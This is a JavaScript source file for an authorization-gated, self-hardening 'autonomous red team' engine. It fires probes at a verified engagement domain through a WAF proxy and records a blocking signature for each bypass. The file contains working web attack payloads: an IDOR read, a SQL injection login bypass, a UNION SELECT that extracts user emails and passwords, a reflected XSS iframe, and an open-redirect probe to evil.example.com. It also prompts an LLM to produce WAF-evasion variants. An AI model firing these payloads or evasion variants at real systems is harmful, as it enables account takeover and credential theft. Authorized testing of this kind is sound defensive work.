// autopilot.js — Autonomous Red Team engine.
//
// Fires REAL payloads at the engagement's verified domain THROUGH the inline
// WAF reverse-proxy (/waf/:id/*). Each payload is judged blocked / bypassed /
// safe from the real response. On a bypass the system HARDENS: it writes a WAF
// signature so the same attack is blocked next time (self-strengthening). Every
// step streams as a live "AI operator" narration event over Socket.IO, so the
// UI can show the agent thinking and acting in real time.
//
// Mount in server.js:
//   import { autopilotRouter, attachAutopilotIo } from './autopilot.js';
//   app.use('/v1/redteam', autopilotRouter);
//   attachAutopilotIo(io);
//   io.on('connection', s => s.on('autopilot:watch', id => s.join('autopilot:' + id)));

import { Router } from 'express';
import { config } from './config.js';
import { gate, getEngagement } from './redteam.js';
import { pool } from './db.js'; // reuse the app's working Neon pool

const SELF = process.env.PUBLIC_BASE || `http://127.0.0.1:${config.port}`;
const GROQ_URL = 'https://api.groq.com/openai/v1/chat/completions';
const GROQ_MODEL = process.env.GROQ_MODEL || 'openai/gpt-oss-20b';

let IO = null;
export function attachAutopilotIo(io) { IO = io; }

const sleep = (ms) => new Promise(r => setTimeout(r, ms));

// ---- schema -------------------------------------------------------------

async function ensureTables() {
  await pool.query(`
    create table if not exists autopilot_runs (
      id serial primary key,
      engagement_id text not null,
      status text not null default 'running',
      score int default 50,
      blocked int default 0,
      bypassed int default 0,
      signatures int default 0,
      findings jsonb default '[]'::jsonb,
      transcript jsonb default '[]'::jsonb,
      started_at timestamptz default now(),
      finished_at timestamptz
    )`);
  await pool.query(`
    create table if not exists waf_signatures (
      id serial primary key,
      engagement_id text not null,
      pattern text not null,
      technique text,
      created_at timestamptz default now()
    )`);
}

// ---- attack surface -----------------------------------------------------
// Non-destructive, read-style probes only. No DROP/DELETE/UPDATE, no writes.

const PHASES = [
  {
    key: 'recon', name: 'Recon & mapping',
    payloads: [
      { method: 'GET', path: '/rest/products', technique: 'recon', desc: 'enumerate product API', detect: () => false },
      { method: 'GET', path: '/api/Challenges', technique: 'recon', desc: 'probe API surface', detect: () => false },
    ],
  },
  {
    key: 'broken_access_control', name: 'Broken access control',
    payloads: [
      { method: 'GET', path: '/api/Users/1', technique: 'bac', desc: 'direct object reference — user 1', signature: '/api/Users/',
        detect: (r) => /"email"\s*:/.test(r.text) && r.status < 400 },
      { method: 'GET', path: '/rest/basket/1', technique: 'bac', desc: 'read another user basket', signature: '/rest/basket/',
        detect: (r) => /"ProductId"|"BasketItem"/.test(r.text) && r.status < 400 },
    ],
  },
  {
    key: 'sql_injection', name: 'SQL injection',
    payloads: [
      { method: 'POST', path: '/rest/user/login', body: { email: "' OR 1=1--", password: 'x' },
        technique: 'sqli', desc: "auth bypass  email=' OR 1=1--", signature: "' OR 1=1--",
        detect: (r) => /"token"|"authentication"/.test(r.text) },
      { method: 'GET', path: "/rest/products/search?q=')) OR 1=1-- -",
        technique: 'sqli', desc: "search SQLi  q=')) OR 1=1-- -", signature: "')) OR 1=1",
        detect: (r) => /SQLITE_ERROR|SQL|syntax error/i.test(r.text) || (/"data"\s*:\s*\[/.test(r.text) && r.text.length > 4000) },
      { method: 'GET', path: '/rest/products/search?q=qwert%27))%20UNION%20SELECT%20id,email,password,%274%27,%275%27,%276%27,%277%27,%278%27,%279%27%20FROM%20Users--',
        technique: 'sqli', desc: 'union-based extraction', signature: 'UNION SELECT',
        detect: (r) => /@|"password"/i.test(r.text) && /"data"\s*:\s*\[/.test(r.text) },
    ],
  },
  {
    key: 'xss', name: 'Cross-site scripting',
    payloads: [
      { method: 'GET', path: '/rest/products/search?q=%3Ciframe%20src%3Djavascript%3Aalert(1)%3E',
        technique: 'xss', desc: 'reflected XSS in search', signature: '<iframe src=javascript',
        detect: (r) => /<iframe src=javascript/i.test(r.text) },
    ],
  },
  {
    key: 'ssrf', name: 'SSRF / redirect abuse',
    payloads: [
      { method: 'GET', path: '/redirect?to=https://evil.example.com',
        technique: 'ssrf', desc: 'open redirect probe', signature: 'redirect?to=',
        detect: (r) => /location|evil\.example/i.test(r.text) && r.status >= 300 && r.status < 400 },
    ],
  },
];

// ---- firing through the WAF --------------------------------------------

async function fire(id, p) {
  const url = `${SELF}/waf/${id}${p.path}`;
  const init = { method: p.method, headers: {} };
  if (p.body) { init.headers['content-type'] = 'application/json'; init.body = JSON.stringify(p.body); }
  try {
    const r = await fetch(url, init);
    const wafHdr = r.headers.get('x-offai-waf') || '';
    const text = await r.text().catch(() => '');
    const blocked = r.status === 403 && /block/i.test(wafHdr);
    return { status: r.status, wafHdr, text, blocked };
  } catch (e) {
    return { error: String(e).slice(0, 160), status: 0, text: '', blocked: false };
  }
}

async function harden(id, p) {
  const pattern = p.signature || p.path;
  try {
    await pool.query(
      `insert into waf_signatures (engagement_id, pattern, technique) values ($1, $2, $3)`,
      [String(id), pattern, p.technique]);
  } catch { /* table may differ; non-fatal */ }
  return pattern;
}

// Optional: let the attacker LLM propose evolved evasion payloads for a phase.
async function proposePayloads(phase) {
  const key = process.env.GROQ_API_KEY;
  if (!key || !['sqli', 'xss'].includes(phase.payloads[0]?.technique)) return [];
  try {
    const r = await fetch(GROQ_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', Authorization: `Bearer ${key}` },
      body: JSON.stringify({
        model: GROQ_MODEL, temperature: 0.6, max_tokens: 300,
        messages: [
          { role: 'system', content: 'You are a red-team payload generator for an AUTHORIZED test. Return ONLY a JSON array of 2 short, non-destructive (read-only, no DROP/DELETE/UPDATE) evasion variants of the given web payload, as raw strings. No prose.' },
          { role: 'user', content: `Technique: ${phase.payloads[0].technique}. Base payload: ${phase.payloads[0].desc}. Give evasive variants that try to slip past a WAF.` },
        ],
      }),
    });
    if (!r.ok) return [];
    const data = await r.json();
    const txt = data?.choices?.[0]?.message?.content || '';
    const arr = JSON.parse(txt.slice(txt.indexOf('['), txt.lastIndexOf(']') + 1));
    if (!Array.isArray(arr)) return [];
    // wrap evolved strings as search-style GET probes (safe)
    return arr.slice(0, 2).map((s) => ({
      method: 'GET', path: '/rest/products/search?q=' + encodeURIComponent(String(s)),
      technique: phase.payloads[0].technique, desc: 'evolved: ' + String(s).slice(0, 48),
      signature: String(s).slice(0, 40),
      detect: (res) => /SQLITE_ERROR|syntax error|<iframe|<script/i.test(res.text),
    }));
  } catch { return []; }
}

// ---- the run ------------------------------------------------------------

async function runAutopilot(id, runId) {
  const room = 'autopilot:' + id;
  const transcript = [];
  const findings = [];
  let blocked = 0, bypassed = 0, signatures = 0, score = 50;

  const emit = (event, payload) => { if (IO) IO.to(room).emit(event, payload); };
  const narrate = (glyph, text, kind = 'info') => {
    const line = { ts: clock(), glyph, text, kind };
    transcript.push(line);
    emit('narration', line);
  };
  const setScore = () => {
    const total = blocked + bypassed || 1;
    score = Math.max(0, Math.min(100, Math.round(50 + 45 * (blocked / total) + signatures * 2 - bypassed)));
    emit('score', { value: score, blocked, bypassed, signatures });
  };

  const eng = await getEngagement(id);
  emit('start', { target: eng?.domain, phases: PHASES.map(p => p.name) });
  narrate('▸', `engagement #${id} authorized — ownership verified, human-approved`, 'run');
  narrate('▸', `locked target: ${eng?.domain} — scope re-checked on every request`, 'run');
  await sleep(500);

  for (let pi = 0; pi < PHASES.length; pi++) {
    const phase = PHASES[pi];
    emit('phase', { index: pi, name: phase.name, status: 'start' });
    narrate('▸', `phase ${pi + 1}/${PHASES.length} — starting ${phase.name}`, 'run');
    await sleep(400);

    let payloads = phase.payloads.slice();
    const evolved = await proposePayloads(phase);
    if (evolved.length) {
      payloads = payloads.concat(evolved);
      narrate('▸', `attacker proposed ${evolved.length} evolved payloads to evade the filter`, 'run');
    }

    let phaseFindings = 0;
    for (let ri = 0; ri < payloads.length; ri++) {
      const p = payloads[ri];
      const phasePct = Math.round(((ri + 1) / payloads.length) * 100);
      const overallPct = Math.round(((pi + (ri + 1) / payloads.length) / PHASES.length) * 100);

      narrate('→', `round ${ri + 1}/${payloads.length} — exploiting: ${p.desc}`, 'req');
      emit('progress', { overallPct, phasePct, round: ri + 1, rounds: payloads.length, phase: phase.name });
      await sleep(650);

      const res = await fire(id, p);
      if (res.error) { narrate('·', `request error: ${res.error}`, 'req'); continue; }

      if (res.blocked) {
        blocked++; setScore();
        narrate('✓', `blocked by the firewall (${res.status})`, 'ok');
        emit('attempt', { technique: p.technique, payload: p.desc, endpoint: p.path, verdict: 'BLOCKED' });
      } else if (p.detect(res)) {
        bypassed++; setScore();
        narrate('⚠', `WAF forwarded it — origin exposed a weakness → BYPASS (${res.status})`, 'byp');
        emit('attempt', { technique: p.technique, payload: p.desc, endpoint: p.path, verdict: 'BYPASSED' });
        await sleep(500);
        const pattern = await harden(id, p);
        signatures++; setScore();
        narrate('✓', `signature learned — "${pattern}" is now blocked for everyone`, 'ok');
        const f = {
          name: findingName(p.technique), severity: severityFor(p.technique),
          endpoint: `${p.method} ${p.path.split('?')[0]}`, payload: p.desc,
          fix: `firewall now blocks the pattern "${pattern}"`,
        };
        findings.push(f); phaseFindings++;
        emit('finding', f);
        // re-fire to prove it is now blocked
        await sleep(450);
        const again = await fire(id, p);
        if (again.blocked) { blocked++; setScore(); narrate('✓', 're-fired the same payload — now blocked', 'ok'); }
      } else {
        narrate('·', `origin handled it safely — no weakness (${res.status})`, 'req');
        emit('attempt', { technique: p.technique, payload: p.desc, endpoint: p.path, verdict: 'SAFE' });
      }
      await persist(runId, { status: 'running', score, blocked, bypassed, signatures, findings, transcript });
    }

    emit('phase', { index: pi, name: phase.name, status: 'done', findings: phaseFindings });
    const next = PHASES[pi + 1];
    narrate('✓', `finished ${phase.name} — ${phaseFindings} finding${phaseFindings === 1 ? '' : 's'}.` + (next ? ` now starting ${next.name}.` : ''), 'ok');
    await sleep(500);
  }

  await persist(runId, { status: 'done', score, blocked, bypassed, signatures, findings, transcript, finished: true });
  narrate('✓', `engagement complete — ${findings.length} findings, ${signatures} signatures learned, security score ${score}.`, 'ok');
  emit('done', { score, blocked, bypassed, signatures, findings });
}

// ---- helpers ------------------------------------------------------------

function clock() {
  const d = new Date();
  return d.toTimeString().slice(0, 8);
}
function findingName(t) {
  return ({ sqli: 'SQL injection', bac: 'Broken access control', xss: 'Cross-site scripting', ssrf: 'SSRF / open redirect' }[t]) || 'Weakness';
}
function severityFor(t) {
  return ({ sqli: 'CRITICAL', bac: 'HIGH', xss: 'MEDIUM', ssrf: 'MEDIUM' }[t]) || 'LOW';
}
async function persist(runId, s) {
  try {
    await pool.query(
      `update autopilot_runs set status=$2, score=$3, blocked=$4, bypassed=$5, signatures=$6,
        findings=$7::jsonb, transcript=$8::jsonb, finished_at=$9 where id=$1`,
      [runId, s.status, s.score, s.blocked, s.bypassed, s.signatures,
       JSON.stringify(s.findings), JSON.stringify(s.transcript), s.finished ? new Date() : null]);
  } catch { /* non-fatal */ }
}

// ---- route --------------------------------------------------------------

export const autopilotRouter = Router();

autopilotRouter.post('/engagements/:id/autopilot', async (req, res) => {
 try {
  const id = req.params.id;
  const eng = await getEngagement(id);
  if (!eng) return res.status(404).json({ error: 'engagement not found' });

  // Defense in depth: the gate re-checks ownership + human approval + scope.
  const g = gate(eng, 'https://' + eng.domain);
  if (!g.ok) return res.status(403).json({ error: 'engagement not authorized', reason: g.reason });

  await ensureTables();
  const ins = await pool.query(
    `insert into autopilot_runs (engagement_id, status) values ($1, 'running') returning id`,
    [String(id)]);
  const runId = ins.rows[0].id;

  // fire and forget — progress streams over socket room autopilot:<id>
  runAutopilot(id, runId).catch(err => {
    if (IO) IO.to('autopilot:' + id).emit('narration', { ts: clock(), glyph: '·', text: 'run error: ' + String(err).slice(0, 160), kind: 'req' });
  });

  res.json({ started: true, runId, room: 'autopilot:' + id });
 } catch (e) {
  console.error('[autopilot]', e);
  res.status(500).json({ error: 'autopilot failed to start', detail: String(e).slice(0, 200) });
 }
});
